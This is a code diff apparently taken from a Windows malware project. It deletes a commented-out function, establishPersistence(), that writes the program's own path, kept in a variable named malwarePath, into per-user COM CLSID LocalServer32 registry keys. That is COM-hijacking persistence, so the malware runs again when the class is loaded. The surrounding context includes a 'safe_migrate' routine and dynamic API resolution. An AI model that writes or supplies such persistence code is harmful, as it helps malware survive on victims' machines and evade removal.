@@ -97,29 +97,3 @@ bool safe_migrate(){
 
     return false;
 }
-
-
-/*
-bool establishPersistence(){
-    API_TABLE& API = GetAPI();
-    HKEY hKey;
-    wchar_t  malwarePath[MAX_PATH];
-    wchar_t quotedPath[MAX_PATH + 3];
-
-    API.GetModuleFileNameW(NULL, malwarePath, MAX_PATH); 
-    swprintf(quotedPath, MAX_PATH + 3, L"\"%ls\"", malwarePath);
-    
-    const wchar_t* clsid_paths[] = {
-        L"Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\LocalServer32",
-        L"Software\\Classes\\WOW6432Node\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\LocalServer32"
-    };
-
-    for (int i = 0; i < 2; i++) {
-        if (API.RegCreateKeyExW(HKEY_CURRENT_USER, clsid_paths[i], 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-            API.RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)quotedPath, (wcslen(quotedPath) + 1) * sizeof(wchar_t));
-            API.RegCloseKey(hKey);
-        }
-    }
-
-    return true;
-}*/
